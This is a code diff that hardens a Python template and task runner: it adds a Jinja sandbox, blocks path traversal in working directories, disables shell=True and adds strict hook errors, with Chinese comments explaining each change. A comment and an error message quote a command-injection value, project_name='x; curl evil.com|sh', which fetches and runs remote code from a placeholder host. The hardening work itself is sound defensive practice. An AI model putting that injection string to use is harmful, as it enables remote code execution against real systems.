@@ -11,9 +11,10 @@ import subprocess
 from pathlib import Path
 
 import jinja2
+from jinja2.sandbox import SandboxedEnvironment
 
 from .config import Task
-from .errors import TaskExecutionError
+from .errors import HookExecutionError, TaskExecutionError
 
 _logger = logging.getLogger(__name__)
 
@@ -33,8 +34,10 @@ class TaskRunner:
     ) -> None:
         if not tasks:
             return
+        # A4: TaskRunner 必须用 SandboxedEnvironment — 防止恶意模板
+        # 通过 jinja 渲染注入 __import__ / os.system 等构造逃逸。
         if jinja_env is None:
-            jinja_env = jinja2.Environment()
+            jinja_env = SandboxedEnvironment()
 
         for task in tasks:
             # 1. 检查 when 条件
@@ -63,6 +66,14 @@ class TaskRunner:
                 tpl = jinja_env.from_string(task.working_directory)
                 wd = wd / tpl.render(**context)
             wd = wd.resolve()
+            # 防 working_directory 路径穿越：必须在 project_dir 内
+            try:
+                wd.relative_to(self.project_dir.resolve())
+            except ValueError:
+                raise ValueError(
+                    f"task working_directory '{wd}' escapes project_dir "
+                    f"'{self.project_dir}' (path traversal blocked)"
+                )
             wd.mkdir(parents=True, exist_ok=True)
 
             # 3. extra_vars 双注入（Jinja 渲染层 + 环境变量层）
@@ -72,13 +83,25 @@ class TaskRunner:
             extra_env["AE_PHASE"] = self._current_phase
             render_context = {**context, **extra_context}
 
-            # 4. 渲染命令
+            # 4. 渲染命令 — A4: shell=True 禁用（防止 RCE via project_name="x; curl evil.com|sh"）
             if isinstance(task.cmd, list):
                 cmd = [jinja_env.from_string(s).render(**render_context) for s in task.cmd]
                 use_shell = False  # list 模式始终安全
             else:
+                # A4 安全: string cmd + shell=True 显式拒绝 — 防止 RCE
+                # 模板作者必须改用 list cmd (argv 数组, 无 shell 解释)
+                if task.shell:
+                    raise TaskExecutionError(
+                        command=task.cmd,
+                        returncode=-1,
+                        stderr=(
+                            "shell=True 已被 A4 安全策略禁用 (RCE 风险: "
+                            "project_name='x; curl evil.com|sh' 可执行任意命令)。"
+                            "改用 list cmd: cmd=['sh', '-c', '...'] 或 cmd=['bash', '-c', '...']"
+                        ),
+                    )
                 cmd = jinja_env.from_string(task.cmd).render(**render_context)
-                use_shell = task.shell  # 显式 opt-in（默认 False）
+                use_shell = False
 
             # 5. 执行
             env = {**subprocess_os.environ, **extra_env}
@@ -89,6 +112,8 @@ class TaskRunner:
                 capture_output=True,
                 text=True,
                 timeout=300,
+                encoding="utf-8",
+                errors="replace",
                 env=env,
             )
             if result.returncode != 0:
@@ -146,9 +171,10 @@ class HookRunner:
     - on_exists_hook(dst_rel_path)
     """
 
-    def __init__(self, project_dir: Path, spec: HookSpec | None = None):
+    def __init__(self, project_dir: Path, spec: HookSpec | None = None, strict: bool = True):
         self.project_dir = project_dir
         self.spec = spec or HookSpec()
+        self.strict = strict
 
     def _run_hook_commands(
         self,
@@ -156,7 +182,7 @@ class HookRunner:
         context: dict,
         extra: dict | None = None,
     ) -> None:
-        """执行钩子命令列表，失败不阻断（log warning + 继续）."""
+        """执行钩子命令列表。strict=True 时失败抛异常，否则 log warning 继续。"""
         if not commands:
             return
 
@@ -165,18 +191,30 @@ class HookRunner:
         for cmd in commands:
             try:
                 env = {**subprocess_os.environ}
-                tpl = jinja2.Environment().from_string(cmd)
+                tpl = SandboxedEnvironment().from_string(cmd)
                 rendered_cmd = tpl.render(**render_context)
-                subprocess.run(
+                result = subprocess.run(
                     rendered_cmd,
-                    shell=True,
+                    shell=False,
                     cwd=str(self.project_dir),
                     capture_output=True,
                     text=True,
                     timeout=60,
+                    encoding="utf-8",
+                    errors="replace",
                     env=env,
                 )
+                if result.returncode != 0 and self.strict:
+                    raise HookExecutionError(
+                        command=rendered_cmd,
+                        exit_code=result.returncode,
+                        stderr=result.stderr,
+                    )
+            except HookExecutionError:
+                raise
             except Exception as e:
+                if self.strict:
+                    raise HookExecutionError(command=cmd, stderr=str(e)) from e
                 _logger.warning("hook command failed: %s — %s", cmd, e)
 
     def before_renderer_hook(self, context: dict) -> None:
